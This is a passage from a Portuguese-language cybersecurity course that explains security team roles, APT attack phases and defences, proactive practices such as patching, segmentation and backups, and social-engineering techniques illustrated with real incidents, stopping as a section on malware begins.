exercícios sejam realizados de maneira justa e que os resultados sejam 
avaliados para melhorar as defesas da organização. 
Funções e Responsabilidades: 
• 
Planejamento de Exercícios de Segurança: A equipe branca organiza 
simulações e war games para testar a eficácia das defesas da 
organização. 

 
 
• 
Avaliação de Resultados: Eles avaliam o desempenho das equipes 
vermelha e azul durante os exercícios e fornecem feedback para 
melhorias. 
• 
Auditoria de Segurança: A equipe branca também pode realizar auditorias 
independentes para avaliar a eficácia geral da postura de segurança da 
organização. 
Benefícios para a Organização: 
• 
Identificação de Falhas: Ao conduzir e avaliar simulações de ataques, a 
equipe branca ajuda a identificar áreas onde as defesas precisam ser 
aprimoradas. 
• 
Melhoria Contínua: Através de uma avaliação imparcial, eles garantem 
que os exercícios de segurança levem a melhorias contínuas na postura 
de segurança. 
 
 
 
IMAGEM 1 – CyberSecurity Wheel: abordagem de estratégia de times de 
segurança utilizada por muitas empresas 
 
A estrutura das equipes coloridas na segurança da informação permite que as 
organizações gerenciem seus esforços de segurança de forma organizada e 
eficiente. Cada equipe desempenha um papel vital, e a colaboração entre elas é 
fundamental para criar uma postura de segurança robusta e resiliente. Ao utilizar 
esse modelo de divisão de responsabilidades, as empresas podem abordar 
diferentes aspectos da segurança de maneira especializada, garantindo que 
todos os ângulos de proteção sejam cobertos. 
 
 
1.2. DEFESA CONTRA ATAQUES AVANÇADOS: APTs (ADVANCED 
PERSISTENT THREADS) 
 
As APTs, ou Ameaças Persistentes Avançadas (Advanced Persistent 
Threats), são um dos tipos mais sofisticados e perigosos de ataques 
cibernéticos. Ao contrário de ataques convencionais, que muitas vezes visam 
alvos de oportunidade e tendem a ser rápidos, as APTs são caracterizadas por 

 
 
sua persistência, foco em objetivos específicos e a habilidade de evitar detecção 
por longos períodos. 
As APTs são executadas por grupos altamente organizados, muitas vezes 
apoiados por governos ou grandes organizações criminosas. Elas têm como alvo 
redes, sistemas ou organizações específicas, buscando roubar informações 
sensíveis, espionar atividades ou, em alguns casos, causar danos sistêmicos. 
As vítimas de APTs geralmente incluem governos, grandes corporações, 
instituições financeiras, e até mesmo organizações não-governamentais que 
possuem informações valiosas. 
Neste contexto, defender-se contra APTs exige uma abordagem sofisticada e 
abrangente, que vai muito além de medidas básicas de segurança. Vamos 
explorar em detalhes o que são as APTs, suas fases e os métodos eficazes de 
defesa. 
 
O Que São APTs? 
As APTs são ameaças cibernéticas prolongadas, conduzidas por atacantes 
altamente qualificados que têm o objetivo de obter acesso contínuo a uma rede 
ou sistema, sem serem detectados, durante um período prolongado. Diferente 
de ataques rápidos, as APTs focam na furtividade e persistência, permitindo que 
os invasores permaneçam dentro de uma rede sem serem notados, muitas vezes 
por meses ou até anos. 
 
Principais Características das APTs: 
• 
Sofisticação: Os atacantes utilizam técnicas avançadas, muitas vezes 
personalizadas, para explorar vulnerabilidades que não são amplamente 
conhecidas (zero-day). 
• 
Foco em Alvos Específicos: Ao contrário de ataques oportunistas, as 
APTs têm um alvo definido, que pode ser uma organização ou um setor 
específico. 
• 
Persistência: O objetivo é manter acesso a longo prazo, movendo-se 
lateralmente pela rede e evitando detecção. 
• 
Furtividade: As APTs empregam técnicas para evitar serem detectadas 
por sistemas de defesa tradicionais, como firewalls e antivírus. 
• 
 
Fases de Um Ataque APT 
Os ataques APT seguem uma série de fases, cada uma cuidadosamente 
planejada para garantir que os invasores obtenham e mantenham acesso à rede-
alvo. A seguir, detalhamos as principais etapas: 
1. Reconhecimento 
o Objetivo: Nesta fase inicial, os atacantes coletam informações 
sobre o alvo. Isso pode envolver o uso de engenharia social, coleta 
de dados públicos ou a exploração de informações de insiders. 
o Métodos: 
§ 
Coleta de informações sobre a infraestrutura do alvo. 
§ 
Mapeamento de funcionários e suas funções dentro da 
organização. 
§ 
Pesquisa de vulnerabilidades nos sistemas da organização. 
2. Invasão Inicial (Infection) 
o Objetivo: Conseguir o primeiro ponto de acesso à rede. Os 
atacantes podem usar técnicas de phishing, exploração de 

 
 
vulnerabilidades conhecidas, ou até mesmo inserção de malware 
em dispositivos externos. 
o Métodos: 
§ 
Enviar e-mails de phishing altamente personalizados. 
§ 
Explorar vulnerabilidades de softwares desatualizados. 
§ 
Aproveitar credenciais fracas ou comprometidas. 
3. Estabelecimento de Ponto de Apoio (Establish Foothold) 
o Objetivo: Uma vez dentro, o atacante implanta malware ou uma 
backdoor (porta dos fundos) que permite acesso remoto e 
persistente à rede. 
o Métodos: 
§ 
Implantação de malwares que se integram discretamente 
aos sistemas da vítima. 
§ 
Criação de backdoors para garantir que, mesmo que o vetor 
de ataque original seja descoberto, o invasor ainda tenha 
acesso. 
4. Escalonamento de Privilégios (Escalation of Privileges) 
o Objetivo: Elevar os privilégios dentro da rede para obter controle 
total ou acesso a sistemas mais sensíveis. Os invasores podem 
tentar comprometer contas administrativas ou sistemas críticos. 
o Métodos: 
§ 
Exploração de vulnerabilidades de escalonamento de 
privilégios no sistema operacional. 
§ 
Roubo de credenciais por meio de keyloggers ou ataques 
de força bruta. 
5. Movimentação Lateral (Lateral Movement) 
o Objetivo: 
Movimentar-se 
pela 
rede 
da 
organização, 
comprometendo outros sistemas, servidores ou estações de 
trabalho. O invasor busca obter acesso a dados mais críticos ou 
sistemas centrais. 
o Métodos: 
§ 
Explorar sistemas vulneráveis na rede interna. 
§ 
Mover-se através de credenciais comprometidas de 
funcionários. 
§ 
Uso de ferramentas legítimas do sistema para evitar 
detecção, como o PsExec ou Remote Desktop Protocol 
(RDP). 
6. Exfiltração de Dados (Data Exfiltration) 
o Objetivo: Roubar informações sensíveis, como dados financeiros, 
segredos comerciais ou documentos confidenciais. Esta é uma 
fase crítica, onde os invasores procuram evitar a detecção ao 
extrair dados para fora da rede. 
o Métodos: 
§ 
Compactar e criptografar dados antes de transferi-los para 
evitar detecção. 
§ 
Transferir dados em pequenos pacotes para não levantar 
suspeitas. 
§ 
Utilizar canais de comunicação legítimos para mascarar a 
transferência de dados (como tráfego HTTPS). 
7. Manutenção de Presença (Maintain Persistence) 

 
 
o Objetivo: Mesmo após a exfiltração dos dados, o objetivo é manter 
acesso contínuo à rede para futuras operações. Isso é feito criando 
backdoors ou instalando malwares persistentes que se reinstalam 
após cada tentativa de erradicação. 
o Métodos: 
§ 
Implantar rootkits ou malwares que se disfarçam como 
componentes legítimos do sistema. 
§ 
Usar backdoors criptografadas para garantir que o acesso 
à rede seja mantido. 
§ 
Manipular logs ou registros para evitar detecção. 
§ 
 
Métodos de Defesa Contra APTs 
Defender-se contra APTs exige uma combinação de medidas proativas, 
defensivas e reativas. Diferentemente dos ataques convencionais, que muitas 
vezes podem ser mitigados com controles básicos de segurança, as APTs 
requerem uma abordagem mais robusta e integrada. 
1. Prevenção Proativa 
• 
Treinamento de Funcionários: A engenharia social, especialmente o 
phishing, é uma das principais formas de entrada para APTs. Treinar 
funcionários para reconhecer e relatar tentativas de phishing pode reduzir 
significativamente o risco de uma invasão inicial. 
• 
Segmentação de Rede: Limitar o movimento lateral de invasores por 
meio da segmentação de rede (ou seja, dividindo a rede em zonas e 
implementando controles rigorosos entre elas) pode dificultar a 
disseminação de uma APT dentro da infraestrutura. 
• 
Gestão de Patches: Manter todos os sistemas e softwares atualizados 
com patches de segurança é essencial para mitigar a exploração de 
vulnerabilidades conhecidas. 
2. Monitoramento e Detecção 
• 
Monitoramento Contínuo: Implementar soluções de monitoramento 
avançado, como SIEM (Gerenciamento de Informações e Eventos de 
Segurança) e ferramentas de detecção de ameaças, permite uma análise 
em tempo real dos comportamentos dentro da rede. 
• 
Detecção de Movimentação Lateral: Ferramentas de deteção de 
intrusões (IDS) e Sistemas de Prevenção de Intrusões (IPS) podem 
ser configurados para detectar movimentações laterais ou tentativas de 
escalonamento de privilégios, alertando as equipes de segurança para 
comportamentos suspeitos. 
• 
Análise Comportamental: Ferramentas que utilizam machine learning e 
inteligência artificial podem ser eficazes para detectar comportamentos 
anômalos que fogem dos padrões normais da rede. 
3. Respostas a Incidentes 
• 
Isolamento e Contenção: Assim que um ataque é detectado, a resposta 
deve ser rápida para isolar a parte comprometida da rede e conter a 
ameaça antes que ela se espalhe. 
• 
Resposta a Incidentes Automatizada: Ferramentas que automatizam 
respostas a incidentes podem ajudar a neutralizar rapidamente as APTs 
antes que causem mais danos. Por exemplo, ao detectar comportamento 
anômalo, uma solução automatizada pode encerrar a sessão de um 
usuário comprometido ou bloquear o acesso a recursos específicos. 

 
 
• 
Backups Seguros: A recuperação de dados após uma exfiltração ou um 
ataque destrutivo pode ser facilitada se a organização mantiver backups 
regulares e isolados dos sistemas principais. 
4. Avaliação e Melhoria Contínua 
• 
Auditorias Regulares de Segurança: Conduzir auditorias frequentes 
ajuda a identificar vulnerabilidades e áreas que precisam ser aprimoradas. 
As simulações de ataque da Red Team e as respostas da Blue Team 
devem ser revisadas regularmente para garantir que a organização esteja 
preparada. 
• 
Testes de Penetração: Realizar testes de penetração frequentes ajuda 
a identificar potenciais brechas de segurança antes que os invasores 
possam explorá-las. 
 
Defender-se contra APTs exige uma abordagem abrangente que integre 
prevenção, monitoramento, detecção e resposta rápida. Organizações que não 
investem em uma estratégia de defesa robusta contra essas ameaças correm o 
risco de sofrerem invasões prolongadas e altamente prejudiciais. A 
implementação de uma combinação de tecnologias avançadas, treinamento 
contínuo de funcionários e uma postura de segurança proativa é fundamental 
para proteger contra as ameaças persistentes e sofisticadas que as APTs 
representam. 
 
1.3. PRÁTICAS DE SEGURANÇA PROATIVAS 
 
As práticas de segurança proativas são abordagens preventivas que ajudam 
as organizações a se anteciparem a possíveis ameaças cibernéticas, em vez de 
reagirem apenas após a ocorrência de um incidente. Enquanto a segurança 
reativa trata de conter e mitigar os danos causados por ataques, a segurança 
proativa visa reduzir a superfície de ataque e minimizar as chances de um 
incidente de segurança ocorrer. Implementar práticas de segurança proativas é 
essencial para criar uma defesa cibernética resiliente e robusta. 
Neste contexto, vamos detalhar as principais práticas de segurança proativas, 
com foco em como elas podem ser implementadas em uma organização para 
proteger dados, sistemas e redes. 
 
1. Gestão de Patches e Atualizações de Software 
A gestão de patches é um dos pilares da segurança proativa. Consiste em 
garantir que todos os softwares e sistemas da organização estejam sempre 
atualizados com os patches de segurança mais recentes, reduzindo a exposição 
a vulnerabilidades conhecidas. 
Detalhes: 
• 
Atualizações Regulares: As organizações devem manter um ciclo 
regular de atualizações de software, priorizando os patches de segurança 
críticos que corrigem vulnerabilidades conhecidas e exploráveis. 
• 
Automação de Patches: O uso de ferramentas automatizadas para 
aplicar patches em sistemas e softwares garante que as atualizações 
sejam implementadas rapidamente, minimizando a janela de exposição a 
ameaças. 
• 
Monitoramento de Vulnerabilidades: Utilizar feeds de inteligência de 
ameaças para se manter informado sobre novas vulnerabilidades 

 
 
descobertas (como vulnerabilidades zero-day) e agir rapidamente para 
corrigir esses problemas. 
Exemplo Prático: 
Uma vulnerabilidade zero-day foi descoberta em um software amplamente 
utilizado. Uma organização proativa garante que o patch de correção seja 
aplicado a todos os seus sistemas em questão de horas após seu lançamento, 
antes que qualquer invasão possa ocorrer. 
 
2. Auditorias de Segurança e Testes de Penetração Regulares 
Auditorias de segurança e testes de penetração (pentests) regulares são 
cruciais para identificar vulnerabilidades em sistemas, redes e aplicativos antes 
que invasores possam explorá-las. 
Detalhes: 
• 
Testes de Penetração Internos e Externos: Os testes de penetração 
simulam ataques cibernéticos, tanto externos (vindos da internet) quanto 
internos (de dentro da rede). O objetivo é identificar falhas de segurança 
e corrigir vulnerabilidades. 
• 
Auditorias de Conformidade: Realizar auditorias de conformidade para 
garantir que a organização esteja aderindo às normas e regulamentos de 
segurança, como GDPR, LGPD, PCI-DSS, e ISO 27001. 
• 
Revisões Regulares de Políticas de Segurança: Revisar e atualizar 
políticas de segurança periodicamente para garantir que estejam 
alinhadas com as ameaças emergentes e as mudanças tecnológicas. 
Exemplo Prático: 
Um banco realiza testes de penetração trimestrais para avaliar sua postura de 
segurança. Durante um desses testes, é identificada uma vulnerabilidade em um 
sistema de autenticação que poderia ser explorada por um invasor externo. A 
correção é implementada imediatamente, antes que qualquer invasão ocorra. 
 
3. Segurança em Camadas (Defense in Depth) 
A abordagem de segurança em camadas, ou defense in depth, é a prática de 
implementar múltiplas camadas de defesa para proteger os sistemas de uma 
organização. Se uma camada for comprometida, outras ainda estarão em vigor 
para evitar o sucesso do ataque. 
Detalhes: 
• 
Camadas de Defesa Múltiplas: Utilizar várias camadas de segurança, 
como firewalls, sistemas de detecção de intrusões (IDS), sistemas de 
prevenção de intrusões (IPS), criptografia, autenticação multifatorial 
(MFA), e segmentação de rede. 
• 
Diversificação de Controles de Segurança: Não confiar apenas em um 
único controle de segurança, como o antivírus. Implementar ferramentas 
complementares para aumentar a eficácia da proteção. 
• 
Redundância de Segurança: Garantir que, mesmo se um sistema de 
segurança falhar, outro esteja em vigor para proteger os ativos críticos da 
organização. 
Exemplo Prático: 
Uma empresa de e-commerce implementa firewalls, IDS/IPS, segmentação de 
rede, criptografia de dados em trânsito e autenticação multifatorial. Se um 
invasor ultrapassar o firewall, o IDS/IPS detecta e bloqueia o ataque. Caso uma 
conta de administrador seja comprometida, a MFA impede o acesso não 
autorizado. 

 
 
 
4. Treinamento Contínuo e Conscientização de Segurança 
Um dos vetores de ataque mais comuns é a exploração de erro humano, 
especialmente por meio de phishing, engenharia social e negligência em práticas 
de segurança. O treinamento contínuo e a conscientização de segurança visam 
educar os funcionários sobre essas ameaças e garantir que todos estejam 
alinhados com as melhores práticas de segurança. 
Detalhes: 
• 
Programas de Treinamento Regulares: Implementar treinamentos 
periódicos para todos os funcionários, cobrindo tópicos como prevenção 
de phishing, boas práticas de senha, uso seguro de redes e dispositivos, 
e a identificação de comportamentos suspeitos. 
• 
Simulações de Phishing: Realizar simulações de phishing para avaliar 
a prontidão dos funcionários e fornecer feedback sobre como reconhecer 
e evitar ataques de phishing. 
• 
Boas Práticas de Segurança: Educar os funcionários sobre boas 
práticas de segurança, como evitar o uso de senhas fracas, não 
compartilhar credenciais, e reportar atividades suspeitas imediatamente. 
Exemplo Prático: 
Uma empresa realiza simulações de phishing trimestrais e descobre que 5% dos 
funcionários clicaram em um link malicioso. Após um treinamento direcionado, 
essa porcentagem cai para menos de 1%, reduzindo significativamente o risco 
de sucesso de ataques baseados em engenharia social. 
 
5. Gestão de Identidade e Acesso (IAM) 
A Gestão de Identidade e Acesso (IAM) garante que os usuários tenham o 
nível apropriado de acesso aos recursos da organização, evitando que 
funcionários tenham mais privilégios do que o necessário. Isso minimiza o risco 
de invasões e acessos não autorizados. 
Detalhes: 
• 
Princípio de Menor Privilégio (PoLP): Implementar o PoLP para garantir 
que os usuários, processos e sistemas tenham apenas o acesso 
necessário para desempenhar suas funções. 
• 
Autenticação Multifatorial (MFA): Requerer MFA para acessar sistemas 
críticos ou informações sensíveis. Isso adiciona uma camada extra de 
proteção, mesmo se as credenciais do usuário forem comprometidas. 
• 
Revisões Regulares de Acesso: Conduzir revisões periódicas dos 
acessos dos usuários para garantir que privilégios excessivos sejam 
removidos e que o acesso esteja alinhado com as responsabilidades do 
cargo. 
Exemplo Prático: 
Uma organização financeira adota a MFA em todos os acessos administrativos 
e implementa o princípio de menor privilégio, garantindo que os funcionários só 
tenham acesso a sistemas diretamente relacionados às suas funções. Revisões 
de acesso são realizadas trimestralmente. 
 
6. Segmentação de Rede 
A segmentação de rede divide a infraestrutura de TI em diferentes zonas, 
restringindo o tráfego entre elas com regras de segurança rígidas. Isso limita a 
movimentação lateral dentro da rede, dificultando a propagação de ataques, 
como ransomware. 

 
 
Detalhes: 
• 
Zonas de Segurança Separadas: Dividir a rede em diferentes zonas de 
segurança com base na criticidade dos ativos, por exemplo, separando 
servidores críticos de estações de trabalho ou redes de convidados. 
• 
Firewalls Internos e ACLs: Utilizar firewalls internos, listas de controle 
de acesso (ACLs) e outros controles para gerenciar o tráfego entre 
diferentes segmentos de rede. 
• 
Isolamento de Sistemas Críticos: Isolar sistemas críticos ou dados 
sensíveis em redes separadas, com regras de acesso estritas, para limitar 
o acesso apenas a usuários e sistemas autorizados. 
Exemplo Prático: 
Em uma universidade, a rede de pesquisa é separada da rede administrativa, e 
ambas são isoladas da rede de alunos e de convidados. Isso garante que um 
ataque em um segmento não comprometa os sistemas mais sensíveis, como 
dados financeiros e de pesquisa. 
 
7. Inteligência de Ameaças e Monitoramento Contínuo 
O uso de inteligência de ameaças permite que uma organização se mantenha 
informada sobre as ameaças emergentes, enquanto o monitoramento 
contínuo garante que a organização possa detectar atividades suspeitas em 
tempo real. 
Detalhes: 
• 
Feed de Inteligência de Ameaças: Integrar feeds de inteligência de 
ameaças com o sistema de monitoramento da organização para receber 
alertas sobre novas vulnerabilidades, ataques e malwares emergentes. 
• 
Monitoramento Contínuo com SIEM: Implementar uma solução de 
SIEM para coletar, correlacionar e analisar logs de segurança em tempo 
real, detectando comportamentos anômalos ou sinais de ataques em 
andamento. 
• 
Automação de Respostas: Utilizar ferramentas de SOAR (Security 
Orchestration, Automation, and Response) para automatizar respostas a 
certos incidentes e alertas de segurança, como o bloqueio de endereços 
IP suspeitos ou a revogação de acessos comprometidos. 
Exemplo Prático: 
Uma empresa utiliza um SIEM integrado a feeds de inteligência de ameaças para 
monitorar suas redes em tempo real. Quando uma nova vulnerabilidade crítica é 
identificada, o sistema alerta automaticamente os administradores, que aplicam 
patches nos sistemas afetados 
 
8. Backups Frequentes 
Backups frequentes são uma prática proativa essencial para garantir a 
continuidade dos negócios em caso de incidentes cibernéticos, falhas de sistema 
ou desastres físicos. Manter cópias de segurança dos dados críticos garante 
que, caso ocorram violações, corrupções de dados ou ataques como 
ransomware, a organização possa restaurar suas operações sem grandes 
perdas. 
Detalhes: 
• 
Cópias de Backup Regulares: Implementar backups diários ou 
semanais dos dados mais críticos, dependendo da necessidade da 
organização, garantindo que a versão mais recente dos dados esteja 
disponível. 

 
 
• 
Armazenamento Offsite e Offline: Para maior segurança, os backups 
devem 
ser 
armazenados 
fora 
do 
local 
principal 
(offsite) 
e, 
preferencialmente, de forma isolada (offline) da rede principal, para evitar 
que ataques, como ransomware, comprometam também os backups. 
• 
Criptografia dos Backups: Garantir que os backups estejam protegidos 
por criptografia, tanto durante a transferência quanto no armazenamento, 
evitando o acesso não autorizado em caso de vazamentos ou roubos. 
• 
Testes de Restauração: É essencial testar regularmente a capacidade 
de restaurar dados a partir dos backups, garantindo que os arquivos e 
sistemas possam ser recuperados rapidamente e com sucesso em caso 
de uma emergência. 
Exemplo Prático: 
Uma empresa de serviços financeiros realiza backups diários dos dados de 
clientes em servidores offline. Quando a organização sofre um ataque de 
ransomware, ela consegue restaurar rapidamente os dados de backups 
recentes, evitando pagar o resgate e minimizando o tempo de inatividade. 
9. Monitoramento Contínuo 
Monitoramento contínuo é uma prática proativa essencial que envolve o 
rastreamento constante da atividade na rede e nos sistemas para detectar e 
responder rapidamente a ameaças. Ferramentas de monitoramento contínuo 
utilizam técnicas avançadas de correlação de eventos e inteligência de ameaças 
para identificar comportamentos anômalos, alertar as equipes de segurança e 
automatizar respostas a potenciais incidentes. 
Detalhes: 
• 
Ferramentas de SIEM (Security Information and Event Management): 
Soluções de SIEM permitem a coleta e análise de dados de segurança 
em tempo real, correlacionando eventos de diferentes fontes para 
detectar atividades suspeitas, como tentativas de login não autorizadas, 
movimentações laterais e comportamentos anômalos. 
• 
Análise Comportamental: Utilizar sistemas que empregam análise de 
comportamento para identificar desvios dos padrões normais de uso, 
como picos inesperados de tráfego ou tentativas repetidas de acessar 
recursos restritos. 
• 
Alertas em Tempo Real: Sistemas de monitoramento contínuo devem 
estar configurados para enviar alertas em tempo real para a equipe de 
segurança sempre que uma atividade suspeita for detectada, permitindo 
respostas rápidas e ações de contenção antes que a ameaça se torne 
crítica. 
• 
Monitoramento de Infraestrutura e Dispositivos IoT: Além de 
monitorar redes e servidores, também é importante rastrear a atividade 
em dispositivos IoT e outras infraestruturas críticas, que muitas vezes são 
negligenciadas, mas podem ser alvos de ataques. 
Exemplo Prático: 
Uma organização utiliza um SIEM para monitorar continuamente os logs de 
segurança de suas redes e sistemas. Durante a noite, o sistema detecta uma 
tentativa de movimentação lateral incomum e envia um alerta em tempo real para 
a equipe de segurança. A equipe investiga e descobre que se trata de um ataque 
em andamento, que é rapidamente contido antes de causar danos significativos. 
 
Esses itens, junto com as práticas previamente discutidas, completam uma 
estratégia de segurança proativa abrangente e robusta. A implementação de 

 
 
backups frequentes e monitoramento contínuo oferece uma camada extra de 
proteção, garantindo a capacidade de recuperação rápida após incidentes e a 
detecção antecipada de ameaças. Essas práticas, quando combinadas com as 
outras abordagens listadas, ajudam as organizações a construir uma defesa 
cibernética sólida e eficaz. 
 

 
 
 
UNIDADE 2 AMEAÇAS E VULNERABILIDADES 
 
Nesta unidade iremos aprender (ou se você já conhece, reciclar) 
conhecimentos sobre técnicas do cotidiano de engenharia social, que não são 
novas, mas se modernizaram ao longo da última década, como: phishing, 
smishing, vishing e spear phishing. Iremos aprender sobre as ameaças mais 
comuns relacionadas a ciberataques ou ataques, como DDoS, malware, 
spyware, zero-day etc. 
Ao final, iremos aprender a calcular vulnerabilidades usando conceitos e 
frameworks para saber colocar a criticidade certa nos problemas de segurança. 
 
OBJETIVOS DA UNIDADE 2 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Compreensão sobre técnicas de engenharia social; 
 
• Saber distinguir diferentes tipos de malware em diferentes situações; 
 
• Calcular vulnerabilidades de segurança. 
 
 
 

 
 
2.1. TÉCNICAS DO COTIDIANO COM ENGENHARIA SOCIAL: PHISHING, 
SPEAR PHISHING E TÉCNICAS DE MANIPULAÇÃO 
 
A engenharia social é uma técnica de ataque que explora as vulnerabilidades 
humanas em vez de brechas tecnológicas. Em vez de invadir sistemas 
diretamente, os atacantes manipulam psicologicamente as vítimas para que 
estas revelem informações confidenciais ou realizem ações que comprometam 
a segurança de uma organização ou de dados pessoais. Dentre as técnicas de 
engenharia social mais comuns e eficazes estão o phishing, o spear phishing 
e outras técnicas de manipulação. Essas técnicas têm sido amplamente 
utilizadas em ataques recentes e causam prejuízos significativos a empresas e 
indivíduos. 
Vamos examinar detalhadamente essas técnicas, fornecer exemplos recentes e 
destacar como elas funcionam no cotidiano. 
 
1. Phishing 
O phishing é uma forma de ataque em massa na qual os atacantes enviam e-
mails, mensagens de texto (smishing) ou mensagens instantâneas com links ou 
anexos maliciosos, fingindo ser de uma fonte confiável. O objetivo é enganar a 
vítima para que ela forneça informações confidenciais, como credenciais de 
login, dados financeiros ou números de cartão de crédito. 
Detalhes: 
• 
Como Funciona: O phishing geralmente envolve o envio de uma 
mensagem que parece legítima, como um e-mail de um banco ou de uma 
rede social, solicitando que a vítima faça login em uma página falsa (um 
site falso que imita o original) ou clique em um link malicioso. Ao fazer 
isso, a vítima inadvertidamente entrega suas credenciais ou instala um 
malware no sistema. 
• 
Principais Características: Os e-mails de phishing frequentemente 
contêm mensagens urgentes, como “Sua conta será suspensa!” ou “Você 
tem uma fatura pendente!”. Isso pressiona a vítima a agir rapidamente, 
sem verificar a autenticidade da mensagem. 
• 
Alvos: Qualquer pessoa pode ser alvo de phishing, incluindo usuários 
comuns, funcionários de empresas ou até organizações inteiras. 
Exemplo Real: 
• 
Ataque à SolarWinds (2020): O ataque cibernético à SolarWinds, uma 
empresa de TI, começou com uma campanha de phishing que visava 
funcionários e fornecedores da empresa. Os invasores conseguiram 
inserir código malicioso no software da SolarWinds, que foi distribuído 
para milhares de clientes, incluindo agências governamentais dos EUA e 
grandes corporações. Isso permitiu aos invasores ter acesso a redes 
sensíveis por vários meses antes de serem detectados. 
Prevenção: 
• 
Educação dos Usuários: Treinamento contínuo para que os funcionários 
saibam reconhecer e-mails de phishing. 
• 
Verificação de URLs: Antes de clicar em links em e-mails, verificar se o 
endereço é legítimo, passando o cursor sobre o link sem clicar. 
• 
Autenticação Multifatorial (MFA): Mesmo que as credenciais sejam 
roubadas, o uso de MFA impede que os invasores acessem a conta sem 
um segundo fator de autenticação. 
 

 
 
2. Spear Phishing 
Spear phishing é uma forma mais direcionada de phishing. Em vez de enviar e-
mails fraudulentos em massa para milhões de pessoas, os atacantes 
personalizam suas mensagens e enviam para um indivíduo ou um pequeno 
grupo específico, com base em informações coletadas previamente sobre as 
vítimas. O objetivo é aumentar a probabilidade de sucesso do ataque, tornando-
o mais difícil de detectar. 
Detalhes: 
• 
Como Funciona: O spear phishing geralmente envolve o uso de 
informações pessoais ou profissionais da vítima, como nome, cargo ou 
detalhes da empresa, para criar um e-mail que pareça genuíno. Os 
atacantes podem se passar por colegas de trabalho, gerentes ou até 
amigos da vítima, pedindo informações sensíveis ou solicitando que a 
vítima execute uma ação que comprometa a segurança, como transferir 
dinheiro ou compartilhar dados confidenciais. 
• 
Alvos Específicos: Geralmente, executivos de alto escalão (CEO, CFO), 
funcionários de RH ou de TI, e qualquer pessoa que tenha acesso a 
informações financeiras ou confidenciais são alvos de spear phishing. 
• 
Aspecto Personalizado: Ao contrário do phishing comum, os atacantes 
do spear phishing pesquisam a vítima com antecedência, muitas vezes 
usando redes sociais ou outras fontes públicas de informações. 
Exemplo Real: 
• 
Twitter (2020): Em julho de 2020, o Twitter sofreu um dos maiores 
ataques de spear phishing. Os atacantes usaram táticas de engenharia 
social para enganar funcionários da empresa e obter acesso às 
ferramentas internas de gerenciamento de contas. Isso permitiu que os 
invasores controlassem contas de alto perfil, como as de Elon Musk, Bill 
Gates e Barack Obama, e publicassem tweets promovendo um golpe de 
criptomoeda. 
Como funcionou: Os atacantes ligaram para os funcionários do Twitter e, 
usando uma combinação de phishing telefônico (vishing) e spear phishing, 
conseguiram convencê-los a fornecer credenciais para acessar os sistemas 
internos da empresa. 
Prevenção: 
• 
Autenticação Estrita para Funções Críticas: Implementar controles 
rígidos, como MFA e autenticação baseada em hardware, para funções 
críticas que podem ter acesso a sistemas internos. 
• 
Treinamento Focado em Executivos e Funções Sensíveis: Realizar 
treinamentos específicos para executivos e funcionários que lidam com 
dados confidenciais, ensinando-os a reconhecer ataques personalizados. 
• 
Monitoramento de Contas e Atividades Anômalas: Implementar 
sistemas que monitoram contas de alto valor e atividades anômalas, como 
tentativas de login em horários incomuns. 
 
3. Técnicas de Manipulação 
As técnicas de manipulação na engenharia social envolvem explorar fraquezas 
psicológicas ou emocionais da vítima. Essas técnicas vão além do phishing e 
spear phishing, utilizando táticas avançadas para manipular a vítima a confiar no 
atacante ou realizar ações perigosas sem perceber o risco. 
Detalhes: 

 
 
• 
Engenharia Social Focada na Confiança: O atacante se faz passar por 
alguém confiável para a vítima, como um colega de trabalho, 
representante de suporte técnico ou parceiro de negócios, ganhando a 
confiança necessária para solicitar informações confidenciais ou 
manipular o comportamento da vítima. 
• 
Uso de Urgência e Autoridade: Muitas vezes, os atacantes se passam 
por figuras de autoridade (gerentes, diretores ou representantes de 
órgãos reguladores) e alegam uma situação urgente que requer a ação 
imediata da vítima. 
• 
Baiting (Isca): Uma técnica de manipulação comum onde o invasor 
oferece algo atrativo para a vítima, como uma recompensa ou acesso a 
uma informação exclusiva, para induzi-la a baixar malware ou fornecer 
dados confidenciais. 
Exemplo Real: 
• 
Engenharia Social no Ataque à Uber (2022): Em setembro de 2022, a 
Uber foi alvo de um ataque de engenharia social que comprometeu seus 
sistemas internos. O invasor utilizou uma combinação de vishing 
(phishing por voz) e engenharia social, fingindo ser um funcionário de TI 
da empresa, para obter as credenciais de um funcionário terceirizado e 
acessar a rede interna. Isso permitiu ao invasor acessar ferramentas 
internas da empresa e sistemas administrativos. 
Como funcionou: O atacante fez contato telefônico com o funcionário 
terceirizado e afirmou ser da equipe de suporte técnico, solicitando informações 
para "resolver um problema". Uma vez que o invasor obteve as credenciais, ele 
conseguiu burlar os sistemas de segurança da Uber. 
Prevenção: 
• 
Verificação de Identidade em Solicitações Sensíveis: Treinar os 
funcionários para verificar sempre a identidade de quem solicita acesso a 
dados ou sistemas, especialmente quando a solicitação vier por telefone 
ou e-mail. 
• 
Políticas de Zero-Trust: Adotar uma política de segurança de "confiança 
zero", onde a verificação contínua é necessária, mesmo dentro da rede 
interna. 
• 
Cultura de Segurança Focada em Desconfiança Saudável: Encorajar 
os funcionários a questionar qualquer pedido incomum, mesmo que 
pareça vir de uma figura de autoridade, especialmente se envolver 
transferência de dinheiro ou fornecimento de dados sensíveis. 
 
Phishing, spear phishing e outras técnicas de manipulação são ferramentas 
poderosas no arsenal dos cibercriminosos, explorando a psicologia humana para 
enganar vítimas e ganhar acesso a dados confidenciais. Esses ataques têm se 
tornado cada vez mais sofisticados e direcionados, com exemplos recentes 
demonstrando seu impacto devastador em empresas e indivíduos. Para se 
proteger, é crucial investir em educação contínua, tecnologias de detecção 
avançada, e políticas de segurança rigorosas, além de criar uma cultura de 
ceticismo saudável dentro da organização. 
 
Essas medidas podem não apenas reduzir as chances de uma invasão bem-
sucedida, mas também preparar as organizações para reconhecer e responder 
rapidamente a qualquer tentativa de engenharia social. 
 

 
 
 
2.2. TIPOS DE AMEAÇAS: MALWARE, ATAQUES DDOS, RANSOMWARE, 
SPYWARE E ATAQUES DE ZERO-DAY 
 
No cenário atual de segurança cibernética, uma ampla gama de ameaças 
cibernéticas representa riscos contínuos para indivíduos, empresas e governos. 
Estas ameaças variam em termos de sofisticação e impacto, e muitas delas 
podem ser combinadas em ataques mais complexos. Compreender as principais 
ameaças cibernéticas — como malware, ataques DDoS, ransomware, 
spyware e ataques zero-day — é essencial para a construção de uma defesa 
eficaz contra-ataques cibernéticos. 
A seguir, exploraremos cada uma dessas ameaças em detalhes, com exemplos 
reais e recentes, além de discutir como elas funcionam e quais medidas podem 
ser tomadas para mitigá-las. 
 
1. Malware (Software Malicioso) 
Malware é o termo geral usado para descrever qualquer software malicioso 
